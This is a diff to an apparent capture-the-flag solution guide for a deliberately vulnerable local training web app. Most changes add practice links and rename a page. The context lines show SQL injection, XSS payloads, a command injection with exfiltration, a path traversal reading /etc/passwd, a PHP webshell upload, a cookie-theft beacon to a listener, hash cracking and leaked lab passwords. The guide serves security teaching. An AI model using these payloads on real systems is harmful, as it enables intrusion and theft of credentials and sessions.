@@ -6,6 +6,8 @@ tags: [css-exam, labs, solution, web]
 
 Try each vuln yourself first (checklist Phase 0 → detect → exploit). `U=http://localhost:8000`.
 
+> 🧭 **Level up (free platforms):** [PortSwigger Web Security Academy](https://portswigger.net/web-security) · [OWASP Juice Shop](https://owasp.org/www-project-juice-shop/) · [TryHackMe](https://tryhackme.com/) · [Hack The Box](https://www.hackthebox.com/)
+
 ## 🏁 Flags — one per vuln (track them on the 📊 Progress page)
 | Vuln | Flag | How you get it |
 |---|---|---|
@@ -19,7 +21,10 @@ Try each vuln yourself first (checklist Phase 0 → detect → exploit). `U=http
 | Weak creds | admin's note (above) | log in as `admin` with the cracked/guessed password |
 | Weak CSP (+ cookie theft) | `FLAG{xss_st34ls_the_c00kie}` (via stored XSS) | DevTools → Network → Response Headers (CSP) + Console `document.cookie`; non-HttpOnly cookie + unsafe-inline |
 
-## 1. SQL injection — auth bypass + UNION  (`login.php`, `index.php?q=`)
+## 1. SQL injection — auth bypass + UNION  (`login.php`, `home.php?q=`)
+
+> 🎯 **Practice this elsewhere:** [PortSwigger — SQL injection](https://portswigger.net/web-security/sql-injection) · [OWASP Juice Shop](https://owasp.org/www-project-juice-shop/)
+
 **Answer:** login is a string-concatenated query → bypass with a comment; search is injectable → UNION-dump every credential.
 **Command:**
 ```
@@ -42,12 +47,18 @@ string and comments out the whole password check, so the bypass is unaffected by
 column count (3) matches so the UNION rows render. Salting only changes the *dump→crack* path: you must
 dump each user's salt and crack per-hash — it does nothing against the injection or weak passwords.
 
-## 2. Reflected XSS  (`index.php?q=`)
+## 2. Reflected XSS  (`home.php?q=`)
+
+> 🎯 **Practice this elsewhere:** [PortSwigger — Reflected XSS](https://portswigger.net/web-security/cross-site-scripting/reflected) · [Google XSS Game](https://xss-game.appspot.com/)
+
 **Answer:** `q` is echoed into the HTML unencoded.
-**Command:** `$U/index.php?q="><script>alert(document.domain)</script>`
+**Command:** `$U/home.php?q="><script>alert(document.domain)</script>`
 **Result:** the script tag lands in the page and executes. **Reason:** no `htmlspecialchars()` on output.
 
-## 3. Stored XSS  (guestbook on `index.php`)  — and "what can XSS actually do?"
+## 3. Stored XSS  (guestbook on `home.php`)  — and "what can XSS actually do?"
+
+> 🎯 **Practice this elsewhere:** [PortSwigger — Stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored) · [OWASP Juice Shop](https://owasp.org/www-project-juice-shop/)
+
 **Answer:** the comment **body** is stored and rendered raw (the author is escaped — put the payload in the *message*).
 **Confirm it runs:** post `<script>alert('stored xss')</script>` in the message → reload → it fires for every visitor.
 
@@ -63,6 +74,9 @@ python3 -m http.server 9001
 > Reflected XSS (search box) steals the same cookie — the difference is stored = hits every visitor automatically; reflected = needs a crafted link.
 
 ## 4. IDOR  (`profile.php?id=`)
+
+> 🎯 **Practice this elsewhere:** [PortSwigger — IDOR / access control](https://portswigger.net/web-security/access-control/idor)
+
 **Answer:** no ownership check — any `id` reveals that user's note + API key.
 **Command:** `curl -s "$U/profile.php?id=1"`
 **Result:** admin's record → `FLAG{sql1_auth_byp4ss_and_1dor}` + API key. **Reason:** object id trusted straight from the URL.
@@ -75,6 +89,9 @@ Decode/crack reps: each record's `private_note` is encoded harder — id 1 plain
 (`hashcat -m 10` → `cookie`). Read all four via the IDOR.
 
 ## 5. Command injection  (`tools.php?host=`)
+
+> 🎯 **Practice this elsewhere:** [PortSwigger — OS command injection](https://portswigger.net/web-security/os-command-injection) · [DVWA](https://github.com/digininja/DVWA)
+
 **Answer:** `host` is concatenated into a shell `ping`. The filter escalates the operator you need, and the
 flag you read is encoded one step harder each level (plaintext → base64 → unsalted SHA-256 → salted md5):
 ```
@@ -92,7 +109,10 @@ curl -s "$U/uploads/pwn.txt"; hashcat -m 10 h.txt rockyou.txt                   
 **Reason:** `shell_exec("ping -c 1 ".$host)` — no escaping; `$(...)` output leaks in ping's "name or service
 not known" error, and the blind level forces write-then-read exfiltration.
 
-## 6. LFI / path traversal  (`index.php?page=`)
+## 6. LFI / path traversal  (`home.php?page=`)
+
+> 🎯 **Practice this elsewhere:** [PortSwigger — File path traversal](https://portswigger.net/web-security/file-path-traversal)
+
 **Answer:** `page` is included with no sanitisation, so `../` escapes the `pages/` directory.
 Decode/crack reps: besides `flag.txt` (plaintext), the same out-of-webroot dir has `flag_b64.txt`
 (`base64 -d`) and `flag_salted.txt` (`<md5>:<salt>` → `hashcat -m 10` → `monkey`); and the hard/expert
@@ -110,6 +130,9 @@ curl -sG "$U/index.php" --data-urlencode "page=../../../../../../../etc/passwd"
 so it is reachable only via traversal and always at exactly 2 `../` from `pages/`.
 
 ## 7. Insecure file upload  (`upload.php`)
+
+> 🎯 **Practice this elsewhere:** [PortSwigger — File upload vulnerabilities](https://portswigger.net/web-security/file-upload)
+
 **Answer:** no extension/type check → upload a PHP webshell under the web root and run it.
 **Command:**
 ```
@@ -127,6 +150,9 @@ cat ../private/upload_flag.sha256salt                   # expert -> <sha256>:<sa
 ```
 
 ## 8. Weak CSP + cookie theft  (every page)
+
+> 🎯 **Practice this elsewhere:** [PortSwigger — Exploiting XSS to steal cookies](https://portswigger.net/web-security/cross-site-scripting/exploiting) · [MDN — Content-Security-Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
+
 
 **Answer:** the CSP is present but bypassable — `script-src 'unsafe-inline'` lets injected inline scripts
 run, `img-src *` lets a beacon exfiltrate to any host, and the session/flag cookie is set **without
@@ -168,6 +194,9 @@ alone would have stopped the theft even with the weak CSP.
 > Request headers are what the browser sends; **CSP and Set-Cookie are response headers** (server → browser).
 
 ## 9. Information disclosure — exposed config backup leaks admin creds
+
+> 🎯 **Practice this elsewhere:** [PortSwigger — Information disclosure](https://portswigger.net/web-security/information-disclosure)
+
 
 **Answer:** a backup of the app config (`config.php.bak`) is left in the web root. Because `.bak` is
 not executed by PHP it is served as plaintext source, leaking `ADMIN_PASS = S3ntinel!Admin` and
@@ -237,6 +266,9 @@ and the ability to forge signed API requests.
 from it; protect sensitive paths with auth (not `robots.txt`); rotate the exposed password and key.
 
 ## 10. Weak / default credentials  (`login.php`)
+
+> 🎯 **Practice this elsewhere:** [PortSwigger — Authentication](https://portswigger.net/web-security/authentication)
+
 **Answer:** several accounts use guessable passwords.
 **Command:** try `admin:S3ntinel!Admin`, `alice:password123`, `bob:letmein`, `svc_backup:Backup2024!` (or Hydra against the form).
 **Reason:** weak password policy on service/user accounts.
@@ -422,6 +454,9 @@ so an online guess / Hydra run (or the config leak in §9) gets you in — no "e
 ---
 
 ## Recon Lab — nested directory discovery (/recon_lab/)
+
+> 🎯 **Practice this elsewhere:** [OWASP Web Security Testing Guide](https://owasp.org/www-project-web-security-testing-guide/) · [feroxbuster](https://github.com/epi052/feroxbuster)
+
 
 Skill: recursive content discovery with a **small** list (`/usr/share/wordlists/dirb/common.txt`). All level names
 (`backup/data/config/old/logs`) are in that list, so size is irrelevant — recursion is the point.
